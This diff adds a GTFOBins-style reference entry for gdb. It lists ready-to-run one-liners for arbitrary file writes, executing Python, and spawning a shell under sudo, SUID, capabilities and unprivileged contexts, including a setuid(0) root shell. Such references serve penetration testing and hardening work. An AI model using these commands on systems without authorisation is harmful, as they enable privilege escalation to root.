@@ -1,0 +1,44 @@
+gdb
+===
+
+File write
+----------
+
+[Sudo]
+    gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+
+[SUID]
+    gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+
+[Unprivileged]
+    gdb -nx -ex 'dump value /path/to/output-file "DATA"' -ex quit
+
+Inherit
+-------
+
+[Sudo]
+    gdb -nx -ex 'python ...' -ex quit
+    This allows to run Python code (`...`).
+
+[SUID]
+    gdb -nx -ex 'python ...' -ex quit
+    This allows to run Python code (`...`).
+
+[Unprivileged]
+    gdb -nx -ex 'python ...' -ex quit
+    This allows to run Python code (`...`).
+
+Shell
+-----
+
+[Capabilities]
+    gdb -nx -ex 'python import os; os.setuid(0)' -ex '!/bin/sh' -ex quit
+
+[Sudo]
+    gdb -nx -ex '!/bin/sh' -ex quit
+
+[SUID]
+    gdb -nx -ex '!/bin/sh' -ex quit
+
+[Unprivileged]
+    gdb -nx -ex '!/bin/sh' -ex quit
